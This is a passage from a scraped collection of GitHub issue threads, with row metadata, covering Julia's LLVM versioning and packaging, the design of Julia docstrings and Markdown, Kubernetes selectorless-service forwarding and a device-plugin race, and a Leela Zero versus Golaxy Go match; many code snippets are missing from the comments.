seems to let you choose among a dozen different Python versions. Yet no one is willing to support more than one arbitrarily chosen version of LLVM at a time.  Yes, we will have to do a julia 0.3.x release built for LLVM 3.5 in order to support various distros.  Can still get GCC versions back to 4.4 in Debian and plenty of other distributions. Treating LLVM any differently makes zero sense.  @friend For the particular case of Debian, there are several LLVM versions coexisting. Currently there are 3.3, 3.4, 3.5 and 3.6-svn in Debian unstable. But 3.3 is going to be removed soon, because it is considered too old and unmaintained.  Yes, upstream has stopped maintaining it, is the main reason. In any case, there is very little we can do about these policies. I do wish that they would let us ship with our own copy of LLVM 3.3, which we can install in  instead of system directories. Not allowing that seems excessive.  I think @friend recently started doing exactly that in his PPA - since we only statically link to LLVM and don't install any of its headers, the only downside to doing it that way is compile time.  @friend If I were shipping a private copy of LLVM 3.3, I would still have to maintain it for the lifetime of Debian Jessie, which means for the next two years. At least I would have to track security issues. Given that it's already unmaintained upstream, it is an unnecessary burden which nobody is willing to take in Debian.  What I have taken to doing in the Ubuntu case, is building our own LLVM, statically linking it with Julia, and calling it good.  Note that there are no LLVM products that are shipped with Julia in this case; everything is statically linked into , so there's no chance of it messing with other installations.  There is still the maintenance burden though.  I completely understand you not wanting to maintain LLVM 3.3 for Debian, but declaring a version that is less than a year old completely dead is kind of strange. We may just have to declare that LLVM is part of the Julia source and not even pretend that linking against it as a shared library provided by the distro is going to work.  @friend The decision that LLVM 3.3 is dead was taken by the¬†LLVM developers, not by Debian. Embedding a copy of LLVM 3.3 in Julia will not solve the issue, at least for Debian, for reasons explained above.  I understand that the constraints of a distro like Debian are different than yours. And at a personal level, I cannot do much about the decision to remove LLVM 3.3 (I tried to argue with the Debian maintainer), and I cannot embed a copy of LLVM 3.3 in the Julia package because this completely goes against the spirit of a distro and could create problems with other parties (such as the security team). My current plan is to ship Julia 0.3 with LLVM 3.5. But if this is something that you definitely don't want to see happen because it could give a bad image of Julia, then the only option left is to not have Julia in the next Debian release. This would be sad, but this is not the end of the world either.  Having a buggy version of Julia in the distribution is probably better and easier to fix later than no version at all, though that's up to Stefan, Jeff, Viral etc to decide. Sounds like this maintenance policy question really needs to be raised on the LLVM list, as more and more downstream projects depend on and distributions need to include specific older versions, and this is starting to interact poorly with LLVM's fast break-everything development style (which has other benefits, but gets in the way here). I know Rust has their own set of problems wrt distributions and bootstrapping, but what happens when Rust hits 1.0 for example? They're probably going to need to support a fixed version of LLVM for a while.  I wasn't under the impression that Debian liked to ship buggy versions of things, but apparently they prefer that to allowing us to link to, you know, our dependencies. We could stand to get a better sense of how well julia 0.3 works with LLVM 3.5. We know there is a failing test, but we should try commenting out that test and see if everything else passes at least.  I'm currently discussing the same issue for Fedora. I may be allowed to use LLVM 3.3 for the next release, but it's not sure yet.  more out-of-tree compilers like Julia and Rust rely on LLVM, it seems they really should review their release policy.  @friend On my 64-bit machine, I can confirm that  is the only failing test with LLVM 3.5.  That's nice. Keno and several others have been going above &amp; beyond to try to keep julia working with LLVM 3.5 reasonably well.  3.5 has OldJIT still... we could switch that back on with 3.5, although that setup is untested - whereas several of us have been using mcjit regularly. On Aug 9, 2014 354 PM, ""Jeff Bezanson"" notifications@friend.com wrote  Has anybody tested the performance of the old jit vs mcjit? I remember having read that the old jit was faster. Is it really an issue to have a package that has a statically linked llvm3.3? How do we do it with libuv? Isn't our version patched so that we cannot use upstream?  I'll have another go at the readdlm thing next week. Hopefully I can figure it out in time for the 3.5 release.  @friend Indeed libuv is included as an embedded copy in the Debian package. But first, this is supposed to be a temporary situation (see the JuliaLang/libuv#2). And second, libuv is a much smaller codebase than LLVM. Which means that it is much more manageable to maintain a forked embedded copy of libuv than one of LLVM.  I've started to run some experiments on which IR passes cause this in order to try to identify the IR pattern that gets miscompiled. First results Encouraging isn't it ;)?  Seems to be a problem with LLVM's Stack Slot coloring  Specifically, stack slot sharing Feels like I'm getting closer )  Here's a debug dump from the stack coloring pass The second one is with sharing disabled. As you can see the first one deletes two stack slots. Of course this isn't necessarily a problem with the stack coloring pass. It might also be a problem with the analysis pass that it uses.  @friend Why were you thinking the tuple is passed on the stack. From looking at the generated code, the callee is expecting it in xmm.  As far as I can tell, the stack coloring transformation is correct, so I wonder what's going on.  Wow, nice sleuthing! (I missed your question last night...) limping through the disassembly, more or less.  Also, for posterity and general enjoyment, here's the code I wrote to track this down  I see you use  as the extension for your C++ source files now ) The application of julia metaprogramming to C++ here is absolutely mind-boggling.  Whoa. When you go bug-hunting, you carry some heavy weaponry! Poor things don't stand a chance.  Yeah, I love the  This is nuts. @friend, you've outdone yourself. ",73,9,653,0,0,545,25,n,
julia/JuliaLang/8514,0.087395185,JuliaLang,julia,Integrate Docile.jl and Markdown.jl into Base,29528,301,173,0,4,"Some good discussion started here. This is to more formerly track integrating the necessary parts into Base since it seems some good consensus is building. @friend @friend  I'd be happy to get going on this. Also pinging @friend since he's be the source of some great input here. I'll put together a PR over the next few days.  Also pinging @friend who originally suggested to me about Docile.jl as a good starting point. Also @friend has been looking for this.  @friend I recommend waiting until I've worked through overhauling Markdown.jl before finalising anything / setting up PRs. There will probably be some technical changes to work out within Docile/Markdown to get the string macros etc. working smoothly.  Yes, just saw your  branch. I'll wait on your changes.  Docile does look quite good. I'm wondering about  Maybe we should add some special syntax to avoid the  How much can we cut down the dependencies?  For point (2), I feel the system should be as lazy as possible, just populating metadata with strings until interaction and display happen.  Special syntax would be nice. The  is providing the  that I'm using to get file and line numbers for metadata. Would be great to retain that info. Docile doesn't really have any dependencies, it's just harvesting strings and metadata. Lexicon's providing the presentation layer. I agree about the laziness -- I don't have any hard numbers, but when I was parsing docstrings during  package loading was quite a bit slower.  Another thing that needs to be hashed out is what non-standard form of markdown we wish to support.  Inline latex, tables, and cross references seem necessary.  @friend CommonMark [1, 2] looks reasonably promising. Inline math is a must-have feature  -- not sure whether that would be part of the spec though. [1]   HttpServer now uses Docile (thanks to @friend), which could be another interesting case study  That's cool, thanks @friend. Guess I can't make breaking changes now!  I think this is the right way to go. I agree with Jeff's point that special syntax would make Docile nicer to work with.  CommonMark doesn't have any standard for embedded equations; see this discussion.   Pandoc's  + heuristic (opening $ can't be followed by whitespace, closing $ can't be followed by a digit or preceded by whitespace) seems like the most widely used at this point, and is what is used in Jupyter/IJulia.  My understanding in #3988 was always that there would eventually be a special syntax for this; macros are only for prototyping.  Was syntax ever agreed upon for this? Something along the lines of Where  is a new keyword whose ending keyword is , ,  etc. Or just without the  at all and any unassigned string above a documentable block of code is taken to be a docstring?  Jeff and I just talked about this today and a bare string literal in void context followed by a definition seems like the way to go. This should be lowered by the parser something like this becomes the moral equivalent of this Important points about this approach  parsing has no side-effects ‚Äì¬†the construction of the documentation structure still occurs when the code is actually evaluated, not when it is parsed. each module has its own  dictionary; this is important for reloading modules. This ends up just appending all the docs for a given name, including separate doc strings for a single generic function.  An open issue is how to handle adding methods to functions from other modules. Does the definition go into the current module's  dict? What symbol is used for the doc key then?  Just to comment that it's super-exciting to see momentum on this. Looking forward to seeing what emerges.  Is using  as the key type a necessary requirement? Does doing this not restrict the kind of things that can be documented -- namely individual s of a ? If is instead translated to then you could use the / etc as the key instead of a  -- some adjustments to the -block not shown. Is this approach feasible? For adding docs to methods that are being extended from those in a different module, I'd be in favour of adding them to the current module's . I'd find it a bit odd if the docs I write for a method end up in a different module.  Stefan's proposal looks good to me, but plus one for being either being aware of methods properly or being limited to one docstring per function (as opposed to concatenating each successive dosctring regardless). Another way to do this might be something like i.e. indexing doc strings by type as well as name. Key points in this approach  The redefinition problem is handled at the function level rather than the module level, which means that Redefining functions/methods works in a sane way, as opposed to endlessly concatenating onto the existing doc string This will automatically make reloading modules do the expected thing too, so a module-local  isn't necessary to solve that problem (though it might be useful for other reasons)   It removes the dependency on the order of definitions. So you could do fancy things like making more doc strings for more general methods appear first.  (1.i) is my main concern ‚Äì redefining functions messing up their own docs is something we could probably live with / work around / ignore, but if we can solve this early it will make for a much better interactive experience, I think.  Key problems with this approach  As discussed elsewhere (e.g. MichaelHatherly/Docile.jl#29), there is no need for documentation objects to be a string; they can be any Julia object with the appropriate  methods.   e.g. imagine a documentation object like .  A  keyword allows more generality here.   Docile currently allows additional metadata to be stored in the documentation, e.g.  Docile currently allows  vs.  in order to distinguish documentation for a  in general vs. documentation for a .  One possibility would be to make the  keyword optional for string literals (including string macros like ), but to allow it for more complicated documentation.  Documentation specific to argument signature is definitely better than concatenation, plus one for documentation being anything with a  method. A transformation like would also let us evaluate documentation objects only when they are needed. e.g.  could call the closure and cache the result.  I know that this is probably not a popular opinion but I really think we should consider using Restructured Text at least for the default markup in Base.   It supports everything we will want (inline math / code, cross-links, tables, etc.), supports extensions in the standard for functionality we would want to add, and would allow us to reuse all the tooling in developed in the Python world (Sphinx, ReadTheDocs, etc.) which imo is the best out there. Otherwise I see us developing yet another superset of Markdown to support our needs which may or may not be consumable by other tools.  I guess if we pick a superset with better tooling support (such as PanDoc markdown with all the extensions) we might be able to mitigate this problem.  These are good points. Having an API for this is key, as that will allow even more flexibility than a keyword. For fancy documentation needs, use the API instead of the special syntax. It's probably also true that we'll want to associate docs with particular type signatures. I think associating arbitrary metadata with every docstring is overengineering at this point. Where we are, we can't even ask for help for a simple function in a package.  ReStructured Text is awful. I wrote most of the original manual and writing it in Markdown was a pleasure. Writing documentation has been a painful chore ever since we switched from Markdown to RST. Having complicated formatting types for documentation is overkill and something that we can consider, if at all, only if there's strong evidence of a real need in practice. I don't think there will be any such need. There should be essentially no choice about documentation ‚Äì¬†the worst possible situation is one where everyone writes docs in their personal favorite format and there are a dozen of them. There should be one reasonable way to write docs that works well and that everyone is familiar with. What we generate during parsing should be simple and easy for the parser to construct ‚Äì¬†i.e. just strings ‚Äì¬†and these strings should look decent if you just show them as is. Markdown fits the bill perfectly ‚Äì¬†it is already (by design) how people intuitively markup plain text content.  @friend, as I've discussed in the abovementioned Docile issue, the plan for typical documentation objects (e.g. Markdown text) is to store only the unparsed string when the file is loaded.  Parsing of the AST, generation of HTML, etcetera, is only performed ""lazily"" when the help is requested in some format. @friend, the choice of format is orthogonal to this feature if my suggestion is adopted.   Markdown documentation would be  (creating a  object), Restructured Text would be  (creating a  object), etc.  Each would have appropriate  methods to generate text/html, text/latex, or whatever.   We can argue about what format should be used in Base elsewhere.  @friend, we absolutely have to have some kind of metadata if you want to have any possibility of generating offline documentation, because you can't just have a long list of 3000 functions in Base, sorted alphabetically.  At the very least, you have to be able to mark what section and subsection of the manual they should appear in.  Let's cross that bridge when we get there.  @friend, the antecedent of ""that"" in your comment is unclear.  I meant the issue of generating offline documentation. Alphabetical listings of documentation with a hierarchy implied by modules is what Java uses, and while that's not amazing, it does work. Indicating how to structure the presentation of docstrings seems like something that could easily be done by providing an external outline that references the objects to be documented in the desired organization.  We already have our functions well separated in modules and if this forces us to do some more refactoring, that is not necessarily bad.  @friend, we are ""there"" if we want to use this in Base, replacing our current RST documentation, because we need an offline manual.   It would be shortsighted to implement a feature that doesn't satisfy our own immediate needs! Hierarchies implied only be modules seem unacceptable to me, because most Julia modules have more functions than you would just want to list alphabetically ... our methods aren't nicely sorted into big class hierarchies like in Java, so the Java experience isn't a good analogue here. @friend, do you really want to separate Base into zillions of submodules?  Anything more than a dozen or so methods I would want to start grouping into subsections in a decent manual, and that would correspond to 100+ modules.  @friend if it is so awful why did you switch?  I'm assuming you wanted to use the tooling which is kind of case in point.  Regarding redefining functions &amp; concatenating strings, the way Docile does it (and the way I originally proposed) is that the documentation ( or whatever) is keyed by the  for the generic documentation, and by  for method-specific documentation, and in each case stores arbitrary objects.   Asking for  would normally give you the generic documentation followed by a list of method-specific docs for .  This way, redefining functions doesn't concatenate documentation. Presentation systems (e.g.  or offline docs) have more flexibility in how they order things.  e.g. they don't have to sort methods by the order they happened to be defined in, but can instead sort them by their type signatures or whatever.  And they can put different methods into a bulleted list or whatever format is desired. String concatenation is not appropriate anyway if documentation is an arbitrary object, e.g.  or .   ReST was not really our choice; I believe @friend just did the work and it was a very solid improvement at the time. I would be much happier if we could fix the infamous ""extra newline"" bug. But I agree there is something to be said for a format that's already designed for this very purpose. Can anybody comment on how python or other languages deal with metadata for docstrings? I'm not 100% opposed to it, but I think it is necessarily an extension of a simpler feature. For example, we are likely to support anyway; metadata involves further decorations of that syntax that can be optional.  @friend Honestly, I didn't want to switch, but someone (@friend, iirc) has already done the work and it was an improvement, so we just went with it. Read the docs is nice, but I still hate RST and I'm not that thrilled with the rest of the tooling around RST (random newlines anyone?). If we choose RST as a format, we're stuck with it. If we choose a format we like, we can build all the tooling we need.  I'm confused about how the void string idea is going to work in the REPL. If I type a string into the REPL, then hit enter, what happens?  @friend Nothing ‚Äì it has to be a string in void context followed by something that it can be attached to in the same input.  So it will matter whether I execute string + code at two prompts or string at prompt, then code at prompt?  Isn't metadata something that can be handled within the docstring? Pandoc and Jekyll for example both support YAML front matter in markdown docs to attach arbitrary metadata. We also already have pure Julia Markdown and YAML parsers.  The lack of structured information in Python has been a longstanding problem, as I understand it. Syntax-wise, I would suggest something like the following That is, you would use the  keyword for anything more complex than a string literal (or string macro).  e.g. for generic documentation objects (not strings), or to provide metadata (a Dict of some kind) which could be a variable as in the last example (to share metadata for several related functions).  plus one to metadata inside the doc string.  Do you anticipate entering a lot of doc strings at the prompt?  Metadata inside the docstring implies that construction cannot happen lazily as you would have to parse all docstrings (or eval if they are objects) before you could properly organize them.  Problems with putting the metadata inside the docstring  It requires us to have ""Julia-flavored"" markdown (or whatever) with our own magic metadata markers. It requires us to specify a docstring format, rather than separating format from metadata, and relying on  to convert arbitrary objects to output formats. It makes it hard to share metadata ... e.g. you will often have several methods with the same metadata (e.g. they are all in the section ""Mathematical functions"" and the subsection ""Special functions"" as in my example above), and it would be a lot nicer to not have to retype this in each docstring.   Package loading is already a performance problem ‚Äì constructing lots of dicts during parsing is going to make it way worse.  Metadata could be a list of pairs  and then the overhead would be smaller.  I have zero problem with there being a Julia-flavored markdown format. I suspect it is inevitable. We should try to make sure that it matches the IJulia-flavored markdown as much as possible.  YAML has a standard document begin/end markers. I don't see a standardized docstring format as a bad thing. YAML supports references. So you could write the full metadata once, tag it, then reference it in other docstrings.  I think that having the organization of how doc strings are presented be external to the code and docs is a better approach. I.e. you have an outline where you refer to entities that have doc strings and a tool that weaves this together into HTML pages that can go online. Trying to cram all of the information needed to weave individual doc strings into a coherent final document just isn't going to work well. The doc strings provide bits of content that can be either consumed individually from the REPL or reused when putting together complete documentation. Putting all the organization and metadata into the doc strings is like a worse version of literate programming, which itself hasn't panned out that well.  @friend, I just did a little benchmark.  ing a file defining 10,000 random string constants took 1.47 seconds, while ing a file defining 10,000 random  dictionaries took 3.16 seconds.  This difference doesn't seem that substantial to me, especially since most modules will define much less metadata than this.  2x slower is huge considering the the massive amount of work you have to go through to make the frontend 2x faster.  @friend, losing a factor of 2 in something that only takes 1% of the total loading time for a module means losing a factor of 1%. That being said, having to put a separate placeholder in an offline ""manual outline"" for each function that you want to appear there does not seem terrible to me.  Good documentation combines introductory and transitional material with bits of reference. An outline document is a good place for the introductory and transitional material, and it can simply splice in doc strings in the appropriate places. That way the details remain up-to-date and near the definitions of the functions being described, while the code isn't cluttered with lots of prose, and it isn't forced to be concerned with the structure of the documentation, which often doesn't match the structure of the code.  So basically, I'm proposing this for the overall documentation  doc strings provide bits of markdown-flavored reference material associated with specific objects and symbols there is no structure and no metadata for doc strings beyond this ‚Äì¬†they can be queried and displayed in the REPL or in other interfaces like IJulia and Juno, but they're just organized like a key-value store. high-level documentation is written in the same markdown-flavored format, but it can easily splice in bits of doc string so that the material stays in sync and doesn't have to be repeated.   I don't understand how you'd ""easily"" plug in doc strings. It seems easier indicate sections next to the methods; how do I indicate which function/method I want to plug in, in the outline-thing? (vs. writing the outline/intro material and then plugging in the whole section of docstrings at once.) On Tue, Sep 30, 2014 at 1048 AM, Stefan Karpinski &lt;notifications@friend.com  Totally on board for 1 and 3. I would still prefer to support in-docstring metadata, but I see it as non-essential, and could easily be added later. One issue with splicing in docstrings is that adding a new method necessitates changing the documentation in two places (docstring, and external docs). Whereas metadata would allow defining groups of docstrings to splice in together. I could imagine using a template system like mustache. So external docs would look like  Yes, just what @friend said. I think some amount of metadata in doc strings makes sense ‚Äì just enough so that you can query them by keywords or something. That could easily be satisfied by having a convention that writing  at the bottom of a doc string allows the string to be retrieved by keyword queries. Making this mechanism fully programmable strikes me as asking for abuse and overcomplication.  Does  mean the function-level documentation or all documentation? What if I only want one method of ? On Tue, Sep 30, 2014 at 1116 AM, Stefan Karpinski &lt;notifications@friend.com  I can tolerate omitting generic metadata, but I would strongly prefer using custom string (or other object) types to indicate format, with  for output.  Writing  instead of  is only two extra characters, which is a small price to pay for not locking ourselves into Markdown for the next 20 years. We'll want a string macro anyway, so that we don't need to escape  or  in code samples or LaTeX equations.  LaTeX equations are basically unusable without a string macro to suppress escaping.  Base can ship with only  () (and also text/plain strings, of course), which will serve the purpose of encouraging everyone to use the same format.  (Though as soon as you start thinking about adding custom markdown extensions like keywords, I think the issue of metadata should be revisited.  If you think that creating metadata dicts will slow down loading, wait until you actually try parsing the docstrings at load time.   If you separate the metadata and the docstrings, each docstring need only be parsed when it is displayed.   Dicts are  way more flexible, will arguably be easier to implement because they use the existing parser, and don't require custom markup flavors.)  I am extremely hawkish about load time but I'm not really worried about the slowdown from metadata dicts on docstrings, for reasons that have been discussed already (1) they're not all that slow, (2) not all docstrings will have them, (3) they can be shared among docstrings. My main concern is getting something simple working first so we can have help and docs for packages ASAP. After that there are concerns about complexity and where various information should be stored, but we can continue to discuss that while enjoying the availability of package help )  plus one to having something that works for packages asap.  Yes, plus one to having something vaguely like what's been discussed in this thread soon. I'm happy to adjust Docile to match whatever makes it into Base so that 0.3 packages can have documentation too.  I agree that we should get something asap, with the caveat that major flaws and disagreements should be things that are resolvable later without much breakage. Adding documentation metadata is something that can be done later without breakage, because most docstrings won't have metadata so we will want an optional syntax anyway. Changing  to  if you want markdown-syntax docstrings will be a painful breakage to impose later.  Regarding the  vs  change, if the default is markdown, then changing later is a matter of making markdown the default and allowing other formats optionally. It strikes me as weird to indicate the flavor of markup on a per-doc-string basis. Are you going to use lots of different markups in a single file or even a single project? I'm really not convinced that we'll ever need more than one.  @friend, note that we'll need a string macro anyway in order to easily use LaTeX equations in Markdown (otherwise you have to backslash like crazy).  That would be true if we couldn't change the parser ;-)  I would prefer format-agnostic documentation (requiring only writemime). I don‚Äôt think ‚Äúgetting something out fast‚Äù is affected by which of these we chose. Making something work for special Julia Markdown strings only vs. an equivalent MarkdownString type doesn‚Äôt seem like a big difference as far as implementation effort. Forcing everyone to use the same format seems unfortunate. I agree with having a strong default (i.e. shipping and using only one format in base), but choosing not to support any other format is actively preventing anyone from ever using a different format. There is always some dissent about formats, and if someone strongly prefers rst for their project (for the toolchain, or whatever), then there‚Äôs no reason to actively prevent them from doing so. An example of using different types of documentation in one package some documentation might be in a separate file, so those functions would just like to refer to the file path &amp; have the file actually read lazily. This could be accomplished with a different type (FileDocString or whatever) that behaves appropriately. Allowing user-defined documentation formats would also allow users to define their own extensions to Julia Markdown -- and try them out without forcing them on anyone else or needing to modify the Julia parser.  FWIW I'm in violent agreement with @friend w.r.t allowing whatever system we end up with to store arbitrary metadata, not just strings. My impression is that the clojure community (e.g.) has benefited tremendously from this and built some really cool stuff (core.typed anyone?) on top of it, and it seems uncharacteristically restrictive (for what I see as the ""Julian"" attitude about this sort of thing) to not allow it.  What @friend said! Just learned about how Clojure does this  - very neat! IMO a good implementation would make documentation a special case of a general mechanism to attach metadata to certain kinds of objects. (at least under the hood while providing sufficient syntactic sugar.) ref #3988  which, unless I'm mistaken, is exactly what @friend has been arguing for.  I like the idea of having ""..."" / """"""...""""""be Julia's default Markdown, whatever flavor that is, so we and our tools don't have to think very hard about how to deal with basic comments. I'd also like to see provision, even if just a placeholder for now, to add flexible metadata.  Although most docs right now are either plain text or rich text, there are plenty of areas where a picture or equation would really help, and with tools like IJulia and Juno we already have much of the infrastructure required to serve rich help.  Note also that if we support attaching an arbitrary ""documentation"" object with output via , then including dictionaries of metadata can be implemented on top of this.  e.g. you can have a  type that wraps the ""actual"" documentation object plus a  dictionary of other metadata (Where, as I mentioned above, we probably need an optional  keyword for any documentation object that is not a string literal or string macro.)  FWIW, I find @friend's suggestion really compelling. It seems much easier to make an initial pass that's very vague about what ""should"" go in a MetaDoc object and flesh it out, than to take a stricter rule about strings and later replace it with MetaDoc objects.  I'll just note as a minor point that using some kind of clue, like  or  or whatever, would make things much simpler for editors' and IDE's highlighting, for properly displaying special characters, LaTeX etc., since we can't really expect editors to implement full-blown parsers. Maybe that could be mitigated by using ""a string at global scope is documentation"" as a proxy rule, but I suspect that could turn out messy.  We already have a concept that for creating new syntactic elements, and they are called macros and string macros. Having different rules for  in different contexts would be inconsistent, making Julia more confusing. I'd argue that two extra letters to type for Markdown parsing isn't a big problem. If you use markdown for formatting your documentation, you'll probably have a multiline doc, and two characters seem like a small annoyance. I agree that it is poor style to mix different documentation formats in a single file, it might sometimes be useful. That way you can gradually change format in a file without having to fix all the issues at once. Usually design discussions in Julia has not been won by the argument ""someone is going to use this feature to write horrible unreadable code"".  I have to disagree with this. Firstly, a lot of docstrings are likely to look like i.e. not multiline. That said, it's not really about the two character overhead. The fact is that most people will use the most the most convenient documentation form available, so defaulting to plain docstrings amounts to endorsing them. I'm all for supporting richer formats ( etc.) but supporting both plain and rich docs doesn't make much sense ‚Äì¬†markdown opens a lot of opportunities (nice presentation, syntax highlighting, structured information etc.) without making things more cumbersome, so we should encourage people to use it over plain text as much as possible. Treating  docstrings as  is a very simple and effective way to do that.  This is a good idea. One of the problems with Python docstrings is that they are plain text, and you can't get people to use anything else unless it's endorsed by the language implementation. TIMTOWTDI leads to everyone using the lowest common denominator, i.e. plain text. Unambiguously going with one default markup language in Julia makes it better. Markdown is a good choice, especially as IJulia is the de facto ""more than plaintext"" display environment for Julia.  Putting myself in the loop to make sure Lint can check through doc string correctly.  I think that rather the problem with Python docstrings is that there is no standard way of specifying the format. That means that when you aggregate documentation from docstrings, you have to guess the format, and computers are bad at guessing, so the feature is little used. @friend Maybe that is a valid case, but if I want to save characters to type I'll rather not have to repeat the signature inside the docstring, but have it automatically captured from the actual signature on the next line.  By the way, another reason to support (a) plain-text strings and (b) non-literal documentation strings is importing help from other languages. e.g. in PyPlot I define various functions which are wrappers around Python functions, and I want their help to be automatically imported from the Python docstring.  If we have a  keyword (or ) that supports arbitrary Julia expressions, and allows plain-text strings, this will be easy  Just checking in here to see if we have something usable to start with. Are we still waiting on ?  Markdown.jl is already in that other PR (which is good to go as far as I'm concerned, though I'm happy to make any changes if I've missed anything of course).  Oh yeah we can totally close this ",150,39,875,0,0,506,26,n,
kubernetes/kubernetes/40870,0.044060266,kubernetes,kubernetes,Services without selectors cannot forward to other services as documented,5559,50,49,0,5,"Kubernetes version (use ) Environment Google Container Engine, 1.5.2 What happened I created a selectorless service and configured the endpoint to point at the ClusterIP of another service in a different namespace, as described in the documentation   is supported behaviour (""You want to point your service to a service in another Namespace or on another cluster""). Any requests on the External IP of the selectorless service hang. What you expected to happen Requests to be sent to the target service. How to reproduce it (as minimally and precisely as possible) Start this stack Wait for the  service to be allocated an IP, then try to hit it with curl on port 8080 . There is no output. I would expect the output to be 'I am ALPHA'. Anything else we need to know  Hi there, this seems interesting AFAICT, the problem seems to be a mismatch between the docs and what the  in  actually can do. In , the otherwise purely virtual  are realized by smart DNAT-ing on each node in the cluster (done by ). The DNAT rules are more or less the core functionality, and are defined in the NAT table of , on each node, for each existing endpoint of each service in the cluster. From what I can see, the problem in your case is that the DNAT in  is effectively done only once (all the  chains are traversed just once per packet, see here), so that the request to the  service is effectively resolved to a request to  after it comes out of  (i.e. after all  chains are applied). But,  is not a real IP (it's a virtual service IP), and thus your requests fails as it has no real destination. One way to deal with this is to make  recursively resolve the DNAT rules in case there are chained services as in your case, and then sync them with  (the sync is done in real time anyways). Here is a sketch commit of how this can be ""fixed"" in the code (it works in my dev setup). It would be good to hear a second opinion on whether this use case should indeed be supported. In case you are interested, I can open a PR with the fix and try to merge it.  FYI, the service-to-service forwarding chain didn't work in my dev cluster even if both services are in the same namespace (as the problem described above seems to be conceptual). The services being in different namespaces is a whole separate issue on it's own.  Yes, I apologise, I noticed that this functionality doesn't work even in the same namespace while constructing this issue, but did a bad job of removing the references to namespacing.  It's not surprising to me that this doesn't work.  I don't think this particular usage pattern was  tested or even considered really. It's not invalid, but it's a little weird.  Can you use ExternalName instead, to achieve the desired effect? On Thu, Feb 9, 2017 at 453 AM, Michail Kargakis notifications@friend.com wrote  @friend I'm confused, my usage pattern matches exactly what is documented as a use-case for this functionality Please could you describe how my usage pattern is different? I might be able to use , it depends on the TTL, but in my experience using DNS for traffic routing is a bad idea.  instead, to achieve the desired effect? I got this working with ExternalName, just put the FQDN in the externalName property. I'm running on an on-prem cluster running Actually, according to the description in the docs, ExternalName creates a DNS CNAME which, according to wikipedia (my DNS knowledge isn't that great), is This seems to be semantically consistent with what we're doing.  Yeah, IMO we can probably turn this into a documentation issue.  Sounds like the ""feature"" is supported through ExternalName, but the docs don't make it clear how to achieve this.  Issues go stale after 90d of inactivity. Mark the issue as fresh with . Stale issues rot after an additional 30d of inactivity and eventually close. Prevent issues from auto-closing with an  comment. If this issue is safe to close now please do so with . Send feedback to sig-testing, kubernetes/test-infra and/or . /lifecycle stale  Stale issues rot after 30d of inactivity. Mark the issue as fresh with . Rotten issues close after an additional 30d of inactivity. If this issue is safe to close now please do so with . Send feedback to sig-testing, kubernetes/test-infra and/or . /lifecycle rotten /remove-lifecycle stale  Rotten issues close after 30d of inactivity. Reopen the issue with . Mark the issue as fresh with . Send feedback to sig-testing, kubernetes/test-infra and/or fejta. /close  /reopen @friend did you solve this issue? currently the documentation hasn't changed, BTW. see  @friend you can't re-open an issue/PR unless you authored it or you are assigned to it. &lt;details&gt;  In response to [this]( for interacting with me using PR comments are available [here](  If you have questions or suggestions related to my behavior, please file an issue against the [kubernetes/test-infra]( repository. &lt;/details&gt; @friend no, I never managed to get this working as documented. I gave up on this issue as soon as @friend said ""I don't think this particular usage pattern was  tested or even considered really"" when my exact use-case was listed as an example in the documentation (""You want to point your service to a service in another Namespace or on another cluster""). I've encountered enough wontfix attitudes on open source projects to know that pursuing this would exceed the amount of time I have available to finish this work. In the end I used  in TCP mode and configured it with environment variables.  @friend thanks -)  I created #64668 to clarify if we want this. ",13,25,211,0,0,171,4,n,
kubernetes/kubernetes/56026,0.057748567,kubernetes,kubernetes,Device Plugin Race,1693,20,13,0,0,"Is this a BUG REPORT or FEATURE REQUEST? /kind bug /area hw-accelerators /sig node What happened When re-writing the endpoint code I discovered that the mutex logic is wrong and can lead to a data race while calling the  function. The current logic is a bit convoluted and would make more sense if the map was created in the for loop. However it seems like once the map is assigned to the structure, a device update while calling the  function will lead to a data race, Anything else we need to know? cc @friend  Not quite sure about the race scenario you described, which func do you mean by  function ? The  ?  Did you mean manager.Devices by ?  map is being assigned to  structure with locking protection only. Did you want to say that a race will happen if  is being updated and at the same time  gets invoked? If yes, i dont think so. At both the places, first endpoint.mutex lock is taken. So only one can run at a time and other will wait on mutex. Please let me know if i mistaken something.  Sorry I meant  essentially though the manager.Devices function calls the endpoint.getDevices(). Yes thanks for clarifying this.  I believe we all agree that there is no race in the scenario described in the description of this issue. Shall we close this issue?  @friend there is a race I think I didn't fully read your answer at the time sorry. Because the way maps works when replacing the map in the structure I am now making the Endpoint's map to the local copy of . Which means that every time we lock in the  function we might be changing that copy underneath.  @friend thanks! I got confused b/w call-by-value and call-by-reference and forgot that in golang maps are call by reference. ",7,10,48,0,0,53,8,n,
leela-zero/gcp/1216,0.216706754,gcp,leela-zero," Leela Zero vs Golaxy ,the 4th game (LZ win)",9776,81,43,0.8,7,"Some info on this game Network 3217 is used (20x256 v9), binary is compiled from  with ponder on Move 191 is commented as the winning move by pro player ( file and win rate below 20180417_Golaxy_v9.txt.gz 20180417_Golaxy_v9.sgf.gz   Is there a english commentary version?  Is there log for game 3? People are curious about the two 3-3 LZ played.  Game 5 who won? I can't read Chinese.  Game 5 Galaxy (B) vs. Leela Zero (W) First B move (m,n) with m,n&gt;5 Result Leela Zero won. Galaxy time  I also heard conflicting reports that it was score of B+2.5 , so that means had it not timed out the golaxy would have won ?  My leela was reporting close to 99% winrate when black resigned. Also after playing the rest of endgame myself score was W+0.5.  @friend thanks for the info. So there is two matches left. Its time to have LZ use the same quality of hardware that Golaxy is afforded to use, and a real official net, and no handicap.  @friend We said it multiple times, hardware are similar.  I heard that, but oczam rasor. if its so similiar (which I'm not necessarily disputing) why not just ues exactly the same to remove all doubt and be more scientific as control and fixed control etc In points of fact, one of the matches at least, its LZ only used 5x 1080Ti where Golaxy used 10x1080Ti, and then they stated ""titanV not optimized"" (not sure if that talking about the Nvidia issue with titanv where its calculations get messed up, or that the team can't get LZ to play optimillay on the TitanV or combination of all of the aboves etc) so I don't see how it can be similar if its at 50% and then buggy  I heard today they used 5x1080ti again today. Golaxy insists on using 10x1080ti. The LZ team has to use whatever they can get hold of.  @friend wow really? considering the 6th line move was less than one stone handicap, and that the fact that Golaxy CHOOSE to play other moves higher going for influence strategy, I would say that LZ could have beat golaxy on even if they used hardware parity. ""LZ team has to use whatever they can get hold of"" ? You mean they can't go on aws and rent out 8x V100 for a match or two?  So wasn't it said after the seven games Golaxy was gonna play ke jie? Why can't LZ also play Ke Jie?  I'd imagine Ke Jie is being paid to attend and play. Top pros don't do public exhibition matches for free. )  You must be really rich. Renting 8xV100 costs 42$/hr. So we will cost 42 $/hr  3 hr  7 d = 882 $. I would rather save 882$ and buy a GTX 1080 to produce tens of thousands of games.  @friend I was under the impression that both the golaxy team and the 